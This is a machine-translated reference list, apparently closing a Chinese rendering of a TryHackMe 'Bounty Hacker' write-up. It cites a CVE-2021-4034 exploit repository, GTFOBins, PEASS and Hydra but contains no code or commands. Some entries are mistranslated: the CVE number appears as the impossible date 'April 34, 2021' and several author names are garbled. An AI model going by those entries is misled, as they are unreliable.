stories</span></div></div></div><div class="qb dh qc fq ab qd fp di"><div class="di pt bv pu pv"><div class="dh l"><img alt="" class="dh" src="../Images/e91d6d5a97594a0fdfb555761a774256.png" width="194" height="194" loading="lazy" role="presentation" data-original-src="https://miro.medium.com/v2/resize:fill:388:388/1*Cq7_tlU0Ukq_pR63YMHgCg.png"/></div></div><div class="di pt bv pw px py"><div class="dh l"><img alt="" class="dh" src="../Images/637c9938ab55d24718c20c200ddda1a0.png" width="194" height="194" loading="lazy" role="presentation" data-original-src="https://miro.medium.com/v2/resize:fill:388:388/1*pkGgeXcrKXaHU2eki1bOHQ.png"/></div></div><div class="di bv pz qa py"><div class="dh l"><img alt="" class="dh" src="../Images/78df73524bea8b23f1be91acbb669dc6.png" width="194" height="194" loading="lazy" role="presentation" data-original-src="https://miro.medium.com/v2/resize:fill:388:388/1*_1zitov03vXXuoYr2lje2A.png"/></div></div></div></div></div><h1 id="7af9" class="lq lr iu bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated">参考</h1><p id="9a10" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc oa ke kf kg ob ki kj kk oc km kn ko in bi translated">Apache HTTP服务器(2.2.x版— 2.4.x版)。<em class="kz">Apache HTTP Server 2.4新特性概述</em>。2022年12月5日检索自:【https://httpd.apache.org/docs/2.4/new_features_2_4.html T4】</p><p id="6a1e" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Berardi等人(未标明)。<em class="kz">CVE——2021年4月34日</em>。GitHub仓库。2022年12月5日检索自:<a class="ae ky" href="https://github.com/berdav/CVE-2021-4034" rel="noopener ugc nofollow" target="_blank">https://github.com/berdav/CVE-2021-4034</a></p><p id="ea19" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">t .卡里根(2020年)。<em class="kz"> Linux权限:SUID、SGID和粘滞位</em>。红帽子。2022年12月5日检索自:<a class="ae ky" href="https://www.redhat.com/sysadmin/suid-sgid-sticky-bit" rel="noopener ugc nofollow" target="_blank">https://www.redhat.com/sysadmin/suid-sgid-sticky-bit</a></p><p id="aad7" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">星际牛仔维基(2022年7月5日修订)。<em class="kz">林</em>。2022年12月5日检索自:<a class="ae ky" href="https://cowboybebop.fandom.com/wiki/Lin?oldid=32836" rel="noopener ugc nofollow" target="_blank">https://cowboybebop.fandom.com/wiki/Lin?oldid=32836</a></p><p id="d5ed" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">GTFOBins(未标明)。2022年12月5日检索自:<a class="ae ky" href="https://gtfobins.github.io/" rel="noopener ugc nofollow" target="_blank">https://gtfobins.github.io/</a></p><p id="0cfc" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">m .美并和k .池口(制片人)。(1997–1998).<em class="kz">星际牛仔</em>【电视剧】。日出公司。</p><p id="f524" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">国家脆弱性数据库(未标明)。<em class="kz">CVE-2021–4034详细信息</em>。2022年12月5日检索自:<a class="ae ky" href="https://nvd.nist.gov/vuln/detail/cve-2021-4034" rel="noopener ugc nofollow" target="_blank">https://nvd.nist.gov/vuln/detail/cve-2021-4034</a></p><p id="dd0d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">nmap(未标明)。<em class="kz"> Nmap:网络映射器——免费安全扫描器</em>。2022年12月5日检索自:<a class="ae ky" href="https://nmap.org/" rel="noopener ugc nofollow" target="_blank">https://nmap.org/</a></p><p id="303f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">OpenSSH(7.2p 2版)。<em class="kz">发行说明</em>。2022年12月5日检索自:<a class="ae ky" href="https://www.openssh.com/txt/release-7.2p2" rel="noopener ugc nofollow" target="_blank">https://www.openssh.com/txt/release-7.2p2</a></p><p id="78d6" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">波洛普角(未标明)。<em class="kz">PEASS——权限提升牛逼脚本套件(带颜色)</em>。GitHub仓库。2022年12月5日检索自:<a class="ae ky" href="https://github.com/carlospolop/PEASS-ng" rel="noopener ugc nofollow" target="_blank">https://github.com/carlospolop/PEASS-ng</a></p><p id="cd30" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">《sev uhl》(2020)。<em class="kz">赏金黑客</em>。TryHackMe。2022年12月4日检索自:【https://tryhackme.com/room/cowboyhacker T2】</p><p id="30f6" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Ubuntu(未注明日期)。<em class="kz">乌班图</em>的故事。2022年12月5日检索自:<a class="ae ky" href="https://ubuntu.com/about" rel="noopener ugc nofollow" target="_blank">https://ubuntu.com/about</a></p><p id="79aa" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">van Hauser等人(未注明)。<em class="kz">九头蛇</em>。GitHub仓库。2022年12月5日检索自:<a class="ae ky" href="https://github.com/vanhauser-thc/thc-hydra" rel="noopener ugc nofollow" target="_blank">https://github.com/vanhauser-thc/thc-hydra</a></p><p id="ada6" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">vsftpd (v. 3.0.3)。2022年12月5日检索自:<a class="ae ky" href="https://security.appspot.com/downloads/vsftpd-3.0.3.tar.gz" rel="noopener ugc nofollow" target="_blank">https://security.appspot.com/downloads/vsftpd-3.0.3.tar.gz</a></p><p id="4945" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">xsltproc(未标明)。<em class="kz"> xsltproc —命令行xslt处理器</em>。2022年12月5日检索自:<a class="ae ky" href="http://xmlsoft.org/xslt/xsltproc.html" rel="noopener ugc nofollow" target="_blank">http://xmlsoft.org/xslt/xsltproc.html</a></p></div><div class="ab cl qi qj hy qk" role="separator"><span class="ql bw bk qm qn qo"/><span class="ql bw bk qm qn qo"/><span class="ql bw bk qm qn"/></div><div class="in io ip iq ir"><h2 id="c678" class="no lr iu bd ls np nq dn lw nr ns dp ma kc nt nu me kg nv nw mi kk nx ny mm nz bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae ky" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>